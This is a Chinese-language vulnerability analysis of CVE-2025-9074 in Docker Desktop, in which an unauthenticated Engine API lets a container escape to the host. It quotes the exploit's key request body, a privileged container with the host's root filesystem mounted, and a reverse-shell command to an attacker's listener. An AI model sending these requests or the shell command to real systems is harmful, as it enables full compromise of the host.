## CVE-2025-9074 - Docker Desktop 容器逃逸/远程代码执行(RCE)/未授权访问

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸/远程代码执行(RCE)/未授权访问

**影响应用:** Docker Desktop

**危害等级:** 高危/严重

**CVSS评分:** 9.3

**影响版本:** 影响Windows和macOS版本的Docker Desktop，已于Docker Desktop 4.44.3版本修复，受影响版本为4.44.3之前的版本。

**利用条件:** 需要本地运行的恶意Linux容器；Docker Engine API通过默认子网（192.168.65.7:2375）未授权访问；不依赖增强容器隔离（ECI）或TCP暴露设置。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

Docker Desktop是一个广泛使用的桌面应用程序，旨在帮助开发者在Windows和macOS系统上便捷地运行和管理Linux容器。CVE-2025-9074是一个影响Docker Desktop的关键安全漏洞，其核心在于允许本地运行的恶意Linux容器绕过隔离机制。在默认配置下，恶意容器能够通过预配置的子网（通常是192.168.65.7:2375）直接访问宿主机的Docker Engine API，而无需任何身份验证或挂载Docker socket。该漏洞的严重评分为9.3（满分10分），被归类为高危漏洞，可导致容器逃逸并最终实现宿主机的完全控制（远程代码执行）。该问题影响Windows和macOS版本上的Docker Desktop，并已在2025年8月20日发布的Docker Desktop 4.44.3版本中得到修复。该漏洞不依赖于增强容器隔离（ECI）或TCP暴露设置，使其在多种配置下均可被利用。

**POC有效性分析与利用步骤：**
提供的`exploit.sh`是一个功能完整的Bash脚本，用于利用CVE-2025-9074。该脚本通过以下步骤实现容器逃逸和宿主机远程代码执行：
1.  **目标识别与参数解析**：脚本默认目标为`192.168.65.7:2375`，允许用户通过命令行参数指定不同的IP和端口。同时，它需要攻击者提供监听主机（`LHOST`）和监听端口（`LPORT`），用于接收反向Shell连接。
2.  **获取基础镜像**：脚本首先尝试通过未授权访问目标Docker API (`/images/json`) 来获取一个可用的Alpine Linux镜像。如果未找到Alpine镜像，它会尝试获取其他可用的镜像。这是为了确保后续创建容器时有可用的基础镜像。
3.  **创建恶意容器**：
    *   脚本向Docker API (`/containers/create`) 发送POST请求，创建一个新的容器。
    *   关键配置包括：
        *   `"Image": "$IMAGE"`：使用前面获取到的镜像。
        *   `"HostConfig": {"Binds": ["$MOUNT:/host"], "Privileged": true, "NetworkMode": "host"}`：这是实现容器逃逸的核心。
            *   `"Binds": ["$MOUNT:/host"]`：将宿主机的根文件系统（`MOUNT`变量，默认为`/`）挂载到容器内的`/host`目录。
            *   `"Privileged": true`：赋予容器特权模式，允许其进行更多的系统操作。
            *   `"NetworkMode": "host"`：使容器共享宿主机的网络命名空间，进一步减少隔离。
        *   `"Cmd": ["sh", "-c", "chroot /host /bin/sh -c 'sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"]`：这是容器启动后执行的命令。它使用`chroot`命令将根目录切换到宿主机的根文件系统（即容器内的`/host`），然后在宿主机环境中执行一个反向Shell命令，连接到攻击者的监听主机和端口。
4.  **启动容器**：脚本通过向Docker API (`/containers/$CID/start`) 发送POST请求来启动新创建的恶意容器。一旦容器启动，其中的反向Shell命令就会被执行，从而在攻击者指定的监听端口建立与宿主机的连接。

**POC有效性**：该POC代码逻辑清晰，利用了Docker Desktop中Docker Engine API的未授权访问和容器特权、绑定挂载的组合，确实能够成功实现从容器到宿主机的逃逸并获得远程代码执行。我在分析中认为其有效性极高。

**投毒风险分析：**
本POC代码（`exploit.sh`）的投毒风险被评为低风险（10%）。主要基于以下几点考量：
1.  **代码透明性与可读性**：该POC是一个纯粹的Bash脚本，代码结构清晰，易于阅读和理解。所有操作（如`curl`请求、`grep`解析、参数处理）都直接在脚本中展示，没有进行任何形式的代码混淆。
2.  **无外部依赖**：脚本仅依赖于标准Linux发行版中普遍存在的工具，如`curl`（用于HTTP请求）、`grep`（用于文本解析）、`cut`（用于字符串处理）和`bash`本身。它不包含任何下载或执行外部未知二进制文件、库或脚本的指令。这意味着它不会引入潜在的第三方恶意代码。
3.  **无隐藏功能或可疑行为**：脚本的唯一目的是利用CVE-2025-9074漏洞，通过Docker API创建并启动一个具有特权和宿主机文件系统挂载的反向Shell容器。这个反向Shell是漏洞利用的*目标载荷*，而不是POC本身带有的隐藏恶意功能。脚本中没有发现诸如删除文件、修改系统配置、数据窃取、加密勒索、挖矿程序植入等与漏洞利用无关的恶意行为。
4.  **利用方式明确**：脚本需要用户明确指定监听主机和端口（`-l`和`-p`参数），才能建立反向连接。这意味着攻击者需要主动设置并运行一个监听器来接收Shell，而不是脚本本身会悄悄地连接到某个预设的恶意服务器。
综上所述，尽管该脚本具有强大的攻击能力（实现宿主机RCE），但其本身的设计和实现方式是透明且直接的，不含有额外或隐藏的恶意代码，因此作为研究或测试用的POC，其投毒风险非常低。用户可以安全地审查其代码并理解其功能，而无需担心意外的恶意副作用。

**项目地址:** N/A

**漏洞详情:** N/A
